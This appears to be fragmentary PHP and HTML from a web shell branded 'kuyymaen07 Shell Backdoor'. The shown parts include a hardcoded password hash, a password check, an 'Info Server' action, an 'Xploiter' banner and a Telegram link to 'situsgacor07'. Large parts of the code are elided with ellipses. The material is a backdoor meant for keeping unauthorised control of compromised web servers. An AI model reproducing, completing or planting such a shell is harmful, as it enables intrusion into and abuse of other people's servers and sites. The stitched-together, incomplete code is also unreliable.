...
$password 			= "5c59f2d72fa76815a983b3506654fb0787debcdf";   
$color 				= "#00ff00";
...
<html lang="en">
  <head>
    ...
    <meta charset="utf-8">
		...
		<meta name='author' content='kuyymaen07'/>
		<meta name='author' content='kuyymaen07'/>
		<meta name='copyright' content='kuyymaen07'/>
    ...
    <title>kuyymaen07 Shell Backdoor</title>
    <style>
    	body{
  ...
  <body class="text-white">
    <div class="p-3">
    	<h2 class="text-center">kuyymaen07</h2><hr>
    	...
    	<hr>
    	<center>
    		<small>Copyright &copy; <a href="https://t.me/situsgacor07">kuyymaen07</a></small>
    	</center>
    </div>
...
if( empty($password) || ( isset($_POST['pass']) && (sha1(md5($_POST['pass'])) == $password) ) )
...
<a href='?dir=$dir&aksi=InfoServer' class='fiture btn btn-info btn-sm btn-block mt-2'>Info Server</a>
		...
		<div class=''>
			<h1 class='text-center'><a href='https://t.me/situsgacor07'>[+]kuyymaen07 Xploiter[+]</h1>
